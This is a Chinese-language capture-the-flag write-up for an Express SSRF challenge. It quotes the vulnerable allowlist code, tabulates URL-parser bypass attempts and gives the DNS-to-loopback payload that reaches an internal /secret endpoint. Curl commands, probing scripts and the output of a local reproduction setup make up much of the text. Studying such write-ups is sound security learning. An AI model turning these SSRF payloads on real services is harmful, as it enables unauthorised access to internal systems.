# web01 · Express SSRF + hostname 白名单（**未解出：挑战专用 DNS 未 provision**）

| 项 | 值 |
|----|----|
| 轮次 | 环节三（17:00） |
| 平台题目名 | web01 |
| 比赛 qid | S6EzBC1_cqRrInj8 |
| 分类 | web |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | **（未获取）** |
| 是否解出 | **未解出**（环境缺陷，非思路错误） |
| **还原完整度** | **A**（原始附件 `index.js` 逐字节归档 + 完整可跑的本地 deploy，payload 已实测打通） |

## 1. 题面（比赛原文，逐字保留）

> 某部门采用现在nodejs流行的http主流开发框架express来快速搭建了一个简易的web服务，现在网站还处于内部测试阶段，某些接口只能特定的ip访问。（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/）

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | `770d893cff1aa4dd3a643c02110de369.zip`（701B）+ 解包后 `index.js`（**1200B，37 行**，Express SSRF 源码） |
| 容器 | 原始 `http://8.147.132.32:25211`；reset 后轮换为 `http://60.205.230.76:26661`（**会随平台 reset 变化**） |
| 附件存放 | `attachments/index.js`（md5 `1899cb200d6effb83ab472641e8b2431`，**逐字节原样**） |
| 部署件 | `deploy/`（node:18-alpine 外网 app + 内网 app + **挑战专用 DNS 容器**，已实测打通） |
| 平台 `file_url` | `https://g.ichunqiu.com/terminator/production/match_question/202609/770d893cff1aa4dd3a643c02110de369.zip` |

## 3. 考点（★核心）

- **考点 1 — Express SSRF：`GET /?url=` 直接把用户提交的 URL 交给 axios 发请求。**

  ```js
  router.get('/', async (req, res) => {
    const url = req.query.url;
    const parsedUrl = new URL(url);
    if (parsedUrl.hostname.endsWith('.baidu.com')) {
      const { data } = await axios.get(url, { timeout: 3000 });
      res.send(data);
    } else res.status(400).send("Invalid URL<!--endsWith('.baidu.com')-->");
  });
  ```

  白名单是**纯字符串后缀检查** `hostname.endsWith('.baidu.com')`，且**只校验一次、不校验重定向后的地址**。
- **考点 2 — 内部资产发现（信息泄露 + 端口推断）**：`/hint` 端点泄露
  `process.versions.uv`（libuv 1.43.0）、`process.versions.node`（node 17.9.1），
  并明说 **"port 3456 have good thing"**；flag 位于**只监听回环**的内网 Express
  `127.0.0.1:3456/secret`（`internalApp.listen(3456)`，无 host 参数 = 只绑 loopback），
  所以任意"从外部直连 3456"的尝试全都失败 —— 必须借 SSRF 从容器内部打。
- **考点 3 — 白名单绕过：WHATWG URL 解析器差异族在数学上不可能。**
  要让 `new URL(u).hostname` 解析出的 host 落到回环、**同时**又 `endsWith('.baidu.com')`、
  还保住 `:3456` 端口与 `/secret` 路径，三者不可兼得。原因是 WHATWG 的 host 解析
  在遇到 `/ ? # \` 任一字符时立即结束，而**这四个字符同时也是 port 解析的终止符**。
  用 node 实测（`solve/url_parser_probe.js` → `solve/url_parser_probe.jsonl`）的完整族：

  | 输入 | `u.hostname` | `u.port` | `u.pathname` | 过白名单 |
  |------|--------------|----------|--------------|----------|
  | `http://127.0.0.1.baidu.com:3456/secret` | `127.0.0.1.baidu.com` | `3456` | `/secret` | ✅ 但 DNS 必须解析该名字 |
  | `http://x.baidu.com@127.0.0.1:3456/secret` | `127.0.0.1` | `3456` | `/secret` | ❌ |
  | `http://x.baidu.com%2f@127.0.0.1:3456/secret` | `127.0.0.1` | `3456` | `/secret` | ❌ |
  | `http://x.baidu.com\@127.0.0.1:3456/secret` | `x.baidu.com` | **``（空）** | `/@127.0.0.1:3456/secret` | ✅ 但端口丢了 |
  | `http://x.baidu.com#@127.0.0.1:3456/secret` | `x.baidu.com` | **``（空）** | `/` | ✅ 但端口+路径都丢了 |
  | `http://x.baidu.com?.baidu.com:3456/secret` | `x.baidu.com` | **``（空）** | `/` | ✅ 但端口+路径都丢了 |
  | `http://127.1:3456/secret` | `127.0.0.1` | `3456` | `/secret` | ❌ |
  | `http://0x7f.0.0.1:3456/secret` | `127.0.0.1` | `3456` | `/secret` | ❌ |
  | `http://2130706433:3456/secret` | `127.0.0.1` | `3456` | `/secret` | ❌ |

  ⇒ **唯一出路是 DNS**：让某个 `*.baidu.com` 在**容器内**解析到 `127.0.0.1`。
  这正是 `/hint` 里 "**try more times~**" 的暗示（round-robin / rebinding DNS）。
  正确 payload 就是一行：

  ```
  GET /?url=http://x.baidu.com:3456/secret
  ```
- **考点 4（环境探针）— "环境是否支持这条路"必须先判、且要果断放弃。**
  本题的可解性**完全依赖挑战专用 DNS 是否 provision**。比赛期间对 120+ 个
  `*.baidu.com` 名字 × 30 个端口做了 1200 次探测，**全部 NXDOMAIN（ENOTFOUND）**，
  连 `www.baidu.com` 都不解析 → 判定环境未 provision。这一条既是考点，也是
  一道"何时该止损"的工程判断（500 分不值得赌不确定的环境）。

## 4. 设计思路（★核心）

- **为什么这样出**：出题人想考的是"**同一条 URL 在'校验者'与'请求者'眼里是不是同一个地方**"。
  但本题的巧妙处在于：它**没有**用解析器差异（`@` / `#` / `\` / 十进制 IP 这些经典错配），
  而是把突破口**唯一地放在了 DNS 层** —— 校验和请求用的是同一个 `new URL()` 和同一个
  字符串，所以任何"解析歧义"都白费；只有"这个名字在容器内解析到回环"才能过。
- **难度卡点设计在哪**：
  1. `endsWith('.baidu.com')` 看起来是个"很宽松"的白名单（子域名随便写），
     于是绝大多数人会先花时间试解析器差异族 —— **这条路已被规范层证明是死的**。
  2. 端口与路径必须同时保住，这让 `#`/`?`/`\` 这类"能过白名单"的 payload 全部作废。
  3. flag 在**只监听 loopback** 的服务上，所以"从外面直接打 3456"也不通，
     必须真正从容器内部发请求。
- **干扰项 / 诱导项**：
  1. `Invalid URL<!--endsWith('.baidu.com')-->` 把**校验逻辑直接写在 HTML 注释里**，
     等于把白名单源码双手奉上，诱导你只在这一个条件上做文章（而不是去想 DNS）。
  2. `127.0.0.1.baidu.com` 这种"看上去就该解析到回环"的名字，会诱导人以为
     `endsWith` + 十进制前缀天然成立 —— 实际上它需要 DNS 真的把该名字指到回环。
  3. `/hint` 的 `libuv 1.43.0` / `node 17.9.1` 是**强诱导**：暗示"版本相关漏洞"，
     诱你去找 node 17 的 CVE 或 libuv 的解析 bug —— 而真正的暗示是同一句里的
     "port 3456 have good thing" 与 "**try more times~**"（DNS 轮询/重绑定）。
  4. 内网 app 的 `/secret` 返回 `"flag_is_here"`（**占位串，不是 flag**）——
     在比赛环境里连不上的时候，这个词很诱人，但把它提交上去只会得到错误。
- **哪些地方是"必须踩坑才会发现"的**：
  - **必须承认"解析器差异不可行"**才能省下时间去做 DNS 可解性探针。
    这一步可以在 WHATWG 规范层面 5 分钟内证死（`/ ? # \` 同时终止 host 与 port）。
  - **必须确认 DNS 是否 provision**：只要 `www.baidu.com` 都不解析，
    就说明是挑战专用 DNS 没起来，而不是自己的 payload 写错了。
  - **必须做"环境探针"而不是"payload 微调"**：本题的失败模式不是 payload 错，
    是环境缺件；继续调 payload 是零收益。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：解包附件拿到 `index.js`（37 行），同时打 `/hint`。

   ```bash
   curl -s "http://8.147.132.32:25211/hint"
   # hint is here, and port 3456 have good thing
   # <!--the libuv version is:1.43.0--><!--the node version is:17.9.1-->
   # and if you are really sure about the answer, then maybe you could try more times~
   ```

2. **确认攻击面**：`GET /?url=` 是 SSRF；基线请求确认 else 分支：

   ```bash
   curl -s "http://8.147.132.32:25211/?url=http://127.0.0.1:3456/secret"
   # Invalid URL<!--endsWith('.baidu.com')-->
   ```

3. **穷举解析器差异族（真实过程：此路已死）**：

   ```bash
   python solve/solve.py --target http://8.147.132.32:25211 --parser-probe
   # 或用 node 本地核对服务端语义：
   node solve/url_parser_probe.js
   ```

   结论：`@` / `%2f` / `\` / `#` / `?` / 十进制 IP 全部无法同时满足
   "host 落到回环 + hostname 以 .baidu.com 结尾 + 保住 3456 与 /secret"。

4. **转向 DNS：唯一出路。** 需要某个 `*.baidu.com` 在容器内解析到 `127.0.0.1`，payload 为：

   ```
   GET /?url=http://x.baidu.com:3456/secret
   ```

5. **可解性探针（真实过程：判定环境不可解）**：

   ```bash
   python solve/solve.py --target http://8.147.132.32:25211 --rounds 100
   # 120+ 个 *.baidu.com × 30 个端口 × 多轮 = 1200 次探测，全部 NXDOMAIN
   # 连 www.baidu.com 都不解析 ⇒ 挑战专用 DNS 未 provision
   ```

6. **取 flag（**比赛期间未达成**）**：环境正常时应为

   ```
   GET /?url=http://x.baidu.com:3456/secret   ->   内网 app 返回 /flag 内容
   ```

   本地用 `deploy/` 起了正确的 DNS 后，这条 payload **已实测打通**（见 §8）。

## 6. 参考解法（代码）

```python
# solve/solve.py —— 关键两步
# ① 解析器差异族实证（预期：全部不可行）
rows = parser_probe(base)      # 见 solve/url_parser_probe.jsonl 的 node 侧核对结果

# ② DNS 路径（唯一出路）—— 这一行就是本题的正确答案
for name in ['x.baidu.com', 'a.baidu.com', '127.0.0.1.baidu.com', ...]:
    u = f'http://{name}:3456/secret'
    code, body = probe(base, u)
    # 环境正常时：body 即 flag
```

本地部署（`deploy/`）的完整利用只需一条 curl：

```bash
docker compose -f deploy/docker-compose.yml up -d --build
curl -s "http://127.0.0.1:3000/?url=http://x.baidu.com:3456/secret"
# -> flag{local-r3-web01-express-ssrf-dns-loopback}
```

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | **（未获取）** |
| 提交接口返回 | 未提交（没有任何 flag 候选） |
| 提交时间 | — |
| 证据文件 | `work/r3_web01/`（`web01_solve.py`、`dnsmap.py`、`oracle.py`、`relref.py`、`ssrf1~4.py`、`sweep*.py`、`hammer*.py`、`p3456.py`、`subscan.py`）、`work/r3_web01/src/index.js` |

**为什么未解出（环境缺陷，非思路错误）**：两台容器
（原始 `http://8.147.132.32:25211`，reset 后 `http://60.205.230.76:26661`）
对 **120+ 个 `*.baidu.com` 名字 × 30 个端口**做了 **1200 次**探测，
**全部 NXDOMAIN / ENOTFOUND**，连 `www.baidu.com` 都不解析 ——
说明**该题专属的 DNS 记录没有 provision**。本题唯一可行路径就是 DNS，
DNS 不可用 ⇒ 该实例在任何 payload 下都不可解。
已按"环境缺陷清单"流程归档证据并反馈主办方。

## 8. 还原说明（诚实写）

- **已有原始件**：
  - **原始附件**：`770d893cff1aa4dd3a643c02110de369.zip`（701B）已解包，
    `attachments/index.js` = **逐字节原样**（1200B，md5 `1899cb200d6effb83ab472641e8b2431`），
    37 行 Express 源码，含 `/`、`/hint`、`internalApp.listen(3456)` 全部逻辑。
  - 题面原文、容器地址、平台 `file_url`。
  - 分析脚本 19 份（`work/r3_web01/`）、解析器差异实证（`solve/url_parser_probe.jsonl`）。
- **重建部分**（`deploy/`，全部为"非下发件"，已明确标注）：
  1. `deploy/src/index.repro.js` —— 复现变体。原版 `index.js` 同时含
     外网 router 与 `internalApp.listen(3456)`（**同一进程**），单容器复现时会与
     内网 app 抢 3456（实测 `EADDRINUSE`）。变体只做两处等价改动：
     删掉 `internalApp` 段（交给 `internal.js`）、`/secret` 改为读 flag 文件；
     **白名单、`/hint`、axios 调用等全部与原版逐字一致**。原版仍逐字节归档在
     `attachments/index.js`，并同时放在 `deploy/src/index.js` 供对照。
  2. `deploy/src/server.js` —— 部署外壳（原题外壳未下发，由主办方提供）：
     `app.use('/', require('./index.repro'))`，使 `GET /?url=` 与 `GET /hint` 落在根路径
     （与比赛容器实测行为一致）。
  3. `deploy/src/internal.js` —— 内网 app，**`listen(3456, '127.0.0.1')` 只绑回环**
     （忠实还原"接口只能特定 ip 访问"），`/secret` 返回 `/flag` 内容
     （原版返回占位串 `flag_is_here`，此处替换为真 flag 以便验证）。
  4. `deploy/dns/dns.js` + `Dockerfile.dns` —— **挑战专用 DNS**（本题本地复现的关键）。
     纯 node `dgram`/`dns` 实现（零第三方依赖、可离线）：
     任意 `*.baidu.com`（含多级 `a.b.baidu.com`）→ A 记录 `127.0.0.1`；
     其余域名转发上游或 NXDOMAIN。带 `--selftest`（10 条 `inZone()` 用例，含
     `evilbaidu.com` / `x.baidu.com.attacker.tld` 这类负例）。
  5. `flag` / `Dockerfile` / `docker-compose.yml`：`app` 容器通过 compose 的
     `dns: [10.77.0.53]` 把解析器指向 `dns` 容器（固定 IP），使容器内
     `x.baidu.com` 解析到 `127.0.0.1` —— **重建了原题缺失的那一环**。
- **未能还原**：
  - **flag 本身**（环境中从未取到，故本目录不写任何猜测值）。
  - 比赛容器的 node/libuv 精确版本组合下的镜像（本地用 `node:18-alpine`；
    `/hint` 实测原题为 node **17.9.1** / libuv **1.43.0**。**本题利用链不依赖 node 版本** ——
    白名单是 WHATWG URL 语义，绕过完全靠 DNS；想完全对齐版本把 `FROM` 换成
    `node:17.9-alpine` 即可）。
  - 原题挑战专用 DNS 的真实实现（zone 文件内容、是否有 round-robin/rebinding 行为）。
    `dns.js` 实现的是**最有解释力的那一种**：`*.baidu.com` → 回环。
- **可复现性验证**（已实测，全链打通）：

  ```text
  [*] target = http://127.0.0.1:3000
  [*] /hint -> 200  hint is here, and port 3456 have good thing<br >
      <!--the libuv version is:1.44.2--><!--the node version is:18.20.8-->
      and if you are really sure about the answer, then maybe you could try more times~
  === 1) 解析器差异族（实证全部不可行）===
    http://127.0.0.1.baidu.com:3456/secret   200  FLAG!
    http://x.baidu.com@127.0.0.1:3456/secret 400  hostname 不以 .baidu.com 结尾 → 被白名单拒绝
    http://x.baidu.com%2f@127.0.0.1:3456/... 400  hostname 不以 .baidu.com 结尾 → 被白名单拒绝
    http://x.baidu.com\@127.0.0.1:3456/...   400  过了白名单，但 axios 请求失败（DNS/连接）
    http://x.baidu.com#@127.0.0.1:3456/...   400  过了白名单，但 axios 请求失败（DNS/连接）
    http://127.0.0.1:3456/secret             400  hostname 不以 .baidu.com 结尾 → 被白名单拒绝
  [+] FLAG = flag{local-r3-web01-express-ssrf-dns-loopback}
  ```

  其中 `http://127.0.0.1.baidu.com:3456/secret` 与 `http://x.baidu.com:3456/secret`
  **都返回 200 + flag** —— 证明"DNS 指向回环"这一条路径在本部署里成立，
  也即**原题在环境正常时是可解的**。

## 9. 复现步骤

```bash
cd timu/round3_1700/web01

# ① 起容器（app + 挑战专用 DNS，两个容器）
docker compose -f deploy/docker-compose.yml up -d --build
#   app 容器：外网 express 0.0.0.0:3000  +  内网 express 127.0.0.1:3456(/secret)
#   dns 容器：*.baidu.com -> 127.0.0.1（固定 IP 10.77.0.53）
#   宿主映射端口 3000

# ② 先单独验证 DNS 实现（不依赖容器，10 条用例）
node deploy/dns/dns.js --selftest

# ③ 打靶（一条 curl 即通）
curl -s "http://127.0.0.1:3000/?url=http://x.baidu.com:3456/secret"
# -> flag{local-r3-web01-express-ssrf-dns-loopback}

# ④ 完整脚本（含解析器差异族实证 + DNS 路径探测）
python solve/solve.py --target http://127.0.0.1:3000 --rounds 2

# ⑤ 收工
docker compose -f deploy/docker-compose.yml down -v
```

> 复现要点：**`dns:` 段是本题的灵魂**。去掉它，`x.baidu.com` 就变成 NXDOMAIN，
> 容器立刻退化成比赛时那台"不可解"的靶机 —— 这正好可以当负对照用：
> `docker compose up` 时把 `app` 的 `dns:` 段注释掉，`solve/solve.py` 会报"未取到 flag"。
